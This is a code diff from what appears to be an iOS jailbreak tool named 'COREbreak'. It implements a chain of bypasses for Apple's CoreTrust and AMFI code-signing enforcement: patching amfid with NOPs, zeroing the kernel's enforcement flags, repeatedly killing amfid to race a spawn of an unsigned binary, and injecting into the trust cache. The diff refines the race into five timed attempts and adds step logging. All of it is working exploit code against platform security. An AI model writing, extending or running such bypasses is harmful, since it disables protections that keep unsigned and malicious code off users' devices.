@@ -133,7 +133,14 @@ static bool g_amfid_nop_patched = false;
 
 bool coretrust_amfid_nop_patch(void)
 {
-    printf("[COREbreak] === Strategy 1: amfid NOP patch ===\n");
+    printf("[COREbreak] === [Step 2/6] Strategy 1: amfid NOP patch ===\n");
+
+    // iOS 17+: both RemoteCall exception-thread hijack and direct vm_map
+    // approaches kernel panic. Let other strategies handle the bypass.
+    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"17.0")) {
+        printf("[COREbreak] iOS 17+: skipping amfid NOP (kernel panic)\n");
+        return false;
+    }
 
     int amfidPid = find_pid_by_name("amfid");
     if (amfidPid <= 0) {
@@ -288,7 +295,7 @@ static uint64_t search_cs_enforcement_disable(void)
 
 bool coretrust_amfi_enforcement_flags_zero(void)
 {
-    printf("[COREbreak] === Strategy 2: AMFI enforcement flags ===\n");
+    printf("[COREbreak] === [Step 3/6] Strategy 2: AMFI enforcement flags ===\n");
 
     uint64_t addr = search_cs_enforcement_disable();
     if (!addr) {
@@ -356,37 +363,49 @@ bool coretrust_amfi_enforcement_flags_zero(void)
 
 bool coretrust_kill_amfid_race(const char *testBinPath)
 {
-    printf("[COREbreak] === Strategy 3: amfid kill + race ===\n");
+    printf("[COREbreak] === [Step 4/6] Strategy 3: amfid kill + race ===\n");
     if (!testBinPath || access(testBinPath, X_OK) != 0) {
         printf("[COREbreak] test binary not executable: %s\n", testBinPath ?: "NULL");
         return false;
     }
 
-    int targetPid = find_pid_by_name("amfid");
-    if (targetPid <= 0) {
-        printf("[COREbreak] amfid not running\n");
-        return false;
+    // Try multiple rounds with varying delays to hit the race window
+    for (int attempt = 0; attempt < 5; attempt++) {
+        int targetPid = find_pid_by_name("amfid");
+        if (targetPid <= 0) {
+            printf("[COREbreak] amfid not running (attempt %d/5)\n", attempt + 1);
+            continue;
+        }
+        printf("[COREbreak] killing amfid (pid %d) attempt %d/5...\n",
+               targetPid, attempt + 1);
+
+        kill(targetPid, SIGKILL);
+
+        // Vary the delay for each attempt to hit the race window
+        useconds_t delays[] = { 1000, 3000, 5000, 8000, 12000 };
+        usleep(delays[attempt]);
+
+        pid_t child = 0;
+        const char *argv[] = { testBinPath, NULL };
+        int ret = posix_spawn(&child, testBinPath, NULL, NULL,
+                              (char *const *)argv, NULL);
+
+        if (ret == 0 && child > 0) {
+            printf("[COREbreak] ✅ spawned PID %d during race window!\n", child);
+            int status;
+            waitpid(child, &status, 0);
+            return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
+        }
+
+        // Wait for amfid to respawn before next attempt
+        int waitCycles = 0;
+        while (find_pid_by_name("amfid") <= 0 && waitCycles < 50) {
+            usleep(100000);
+            waitCycles++;
+        }
     }
-    printf("[COREbreak] killing amfid (pid %d)...\n", targetPid);
 
-    // Kill amfid
-    kill(targetPid, SIGKILL);
-    usleep(5000); // 5 ms — race window before launchd respawns amfid
-
-    // Try to spawn the test binary immediately
-    pid_t child = 0;
-    const char *argv[] = { testBinPath, NULL };
-    int ret = posix_spawn(&child, testBinPath, NULL, NULL,
-                          (char *const *)argv, NULL);
-
-    if (ret == 0 && child > 0) {
-        printf("[COREbreak] ✅ spawned PID %d during amfid race window!\n", child);
-        int status;
-        waitpid(child, &status, 0);
-        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
-    }
-
-    printf("[COREbreak] ❌ spawn failed during race: ret=%d\n", ret);
+    printf("[COREbreak] ❌ all %d race attempts failed\n", 5);
     return false;
 }
 
@@ -400,7 +419,8 @@ bool coretrust_bypass_all(void)
            CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
     printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");
 
-    // Step 1: Write a test binary
+    // [Step 1/6]: Write test binary
+    printf("[COREbreak] [Step 1/6] creating test binary...\n");
     char *testPath = write_test_binary();
     if (!testPath) {
         printf("[COREbreak] failed to create test binary\n");
@@ -408,8 +428,7 @@ bool coretrust_bypass_all(void)
     }
     printf("[COREbreak] test binary: %s\n", testPath);
 
-    // Step 2: Try Strategy 1 — amfid NOP patch
-    printf("\n");
+    // [Step 2/6]: Strategy 1 — amfid NOP patch
     bool nopOk = coretrust_amfid_nop_patch();
     if (nopOk) {
         printf("[COREbreak] amfid NOP applied — testing unsigned exec...\n");
@@ -430,8 +449,7 @@ bool coretrust_bypass_all(void)
         printf("[COREbreak] amfid NOP didn't help — continuing...\n");
     }
 
-    // Step 3: Try Strategy 2 — AMFI enforcement flags
-    printf("\n");
+    // [Step 3/6]: Strategy 2 — AMFI enforcement flags
     bool flagsOk = coretrust_amfi_enforcement_flags_zero();
     if (flagsOk) {
         printf("[COREbreak] AMFI flags zeroed — testing unsigned exec...\n");
@@ -452,8 +470,7 @@ bool coretrust_bypass_all(void)
         printf("[COREbreak] AMFI flags didn't help — continuing...\n");
     }
 
-    // Step 4: Try Strategy 3 — amfid kill + race
-    printf("\n");
+    // [Step 4/6]: Strategy 3 — amfid kill + race
     bool raceOk = coretrust_kill_amfid_race(testPath);
     if (raceOk) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
@@ -462,9 +479,8 @@ bool coretrust_bypass_all(void)
         return true;
     }
 
-    // Step 5: Try MountCache as final fallback
-    printf("\n");
-    printf("[COREbreak] falling back to MountCache trust cache injection...\n");
+    // [Step 5/6]: MountCache trust cache injection
+    printf("[COREbreak] [Step 5/6] MountCache trust cache injection...\n");
     bool tcOk = msm_verify_unsigned_execution();
     if (tcOk) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache!\n");
@@ -473,9 +489,8 @@ bool coretrust_bypass_all(void)
         return true;
     }
 
-    // All strategies failed
-    printf("\n[COREbreak] ❌❌❌ All strategies exhausted — CoreTrust bypass failed\n");
-
+    // [Step 6/6]: All strategies failed
+    printf("[COREbreak] [Step 6/6] ❌ All strategies exhausted\n");
     unlink(testPath);
     free(testPath);
     return false;
